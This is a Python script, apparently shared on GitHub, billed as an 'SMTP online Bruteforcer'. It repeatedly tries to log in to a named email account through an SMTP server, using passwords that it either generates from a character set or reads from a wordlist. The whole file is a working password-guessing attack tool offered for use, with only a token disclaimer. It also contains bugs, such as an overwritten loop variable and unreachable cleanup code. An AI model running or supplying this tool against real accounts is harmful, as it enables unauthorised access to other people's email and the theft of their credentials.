import sys
import os 
import string
import itertools
import smtplib
import time 

#############################################   By Yaya7211 https://github.com/yaya7211 #########################################################################

print("\nWelcome to THE SMTP online Bruteforcer. Have fun. (Plz do not use it for illegal purpose, I'm not responsable about what ur gonna do with this)\nBy Yaya7211\n")

cible = sys.argv[1]
serv = sys.argv[2]
serv = serv.split(":")
print("Connecting to ", serv[0]," using port ", serv[1],"...\n \n")
s = smtplib.SMTP_SSL(serv[0], serv[1])
print("Connected !\n \n")
save = open("Use_this_wordlist.txt", "a")


def generateAndBruteForce(cible, minn, maxx, charset) :
	for n in range(minn, maxx + 1) :
		for xs in itertools.product(charset, repeat = n ) :
			charset = ''.join(xs)
			try :
				print("Trying password : ", charset)
				s.login(cible, charset)
			except smtplib.SMTPAuthenticationError :
				print("Incorrect password\n")
				pass
			except smtplib.SMTPServerDisconnected or ConnectionAbortedError:
				print("Connection to", serv[0], " failed :/, you should may be check your connection to Internet.\nWaiting a minute before restarting. . .\n")
				save.write(charset+"\n")
				time.sleep(60)
				pass
			else :
				print("The password found is ", charset)
				break
				save.close()
				exit()

def BruteForceFromWordlist(cible, wordlist, taille) :
	f = open(wordlist, 'r')
	a = 0
	while a != taille :
		password = f.readline()
		try :
			print("Trying password : ", password)
			s.login(cible, password)
		except smtplib.SMTPAuthenticationError :
			print("Incorrect password\n")
			pass
		else :
			print("The password found is ", password)
			break
			f.close()
			exit()


if sys.argv[3] == "gen" :
	generateAndBruteForce(cible, int(sys.argv[4]), int(sys.argv[5]), sys.argv[6])
	print("No matching password found :/ ")
	save.close()
	exit()
else :
	BruteForceFromWordlist(cible, sys.argv[4], int(sys.argv[5]))
	print("No matching password found :/ ")
	exit()

